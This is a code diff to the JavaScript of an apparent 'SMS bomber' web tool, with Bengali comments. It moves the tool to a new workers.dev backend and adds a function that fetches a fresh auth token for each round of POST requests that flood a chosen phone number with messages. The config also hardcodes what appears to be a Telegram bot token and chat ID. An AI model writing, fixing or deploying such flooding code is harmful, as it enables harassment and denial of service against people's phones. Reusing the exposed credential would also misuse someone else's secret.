@@ -433,7 +433,15 @@ footer{position:relative;z-index:2;background:rgba(1,5,1,.99);border-top:1px sol
 // ── CONFIG ──
 const BOT_TOKEN    = "8229374272:AAHUZqtxMIQwkKbiOLSD9HOJkrkuqzaHtdk";
 const CHAT_ID      = "5274336938";
-const API_BASE     = "https://smsbomber.introvertboytushar.workers.dev";
+// ✅ এটা বসাও
+const API_BASE = "https://smsbomber.introvertboytushar.workers.dev";
+
+async function getToken() {
+  const res = await fetch(`${API_BASE}/send_bombing`); // GET = token
+  if (!res.ok) throw new Error('Token failed');
+  const data = await res.json();
+  return data.token;
+}
 let bannedUsers    = [];
 
 // Dynamic token নেওয়ার function
@@ -645,17 +653,21 @@ async function doSend(){
         `<span style="color:rgba(0,255,65,.22);">[${ts()}]</span> `+
         `<span style="color:#ffd700;">#${seq}</span> `+
         `<span style="color:#00bcd4;">POST</span> `+
-        `<span style="color:rgba(0,255,65,.4);">sms-bomber-it.vercel.app/api/send_bombing</span> `+
+        `<span style="color:rgba(0,255,65,.4);">smsbomber.introvertboytushar.workers.dev/send_bombing</span> `+
         `<span style="color:#555;">:${port}</span>`+
         `<span style="color:rgba(0,255,65,.15);"> ▸▸▸</span>`
       );
 
       try{
-       const token = await getToken(); // প্রতি round এ নতুন token
-const res=await fetch(`${API_BASE}/api/send_bombing`,{
-  method:'POST',
-  headers:{'Content-Type':'application/json','x-auth-token':token},
-  body:JSON.stringify({number})
+     
+const token = await getToken();
+const res = await fetch(`${API_BASE}/send_bombing`, {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'x-auth-token': token
+  },
+  body: JSON.stringify({ number })
 });
 
         if(res.ok){
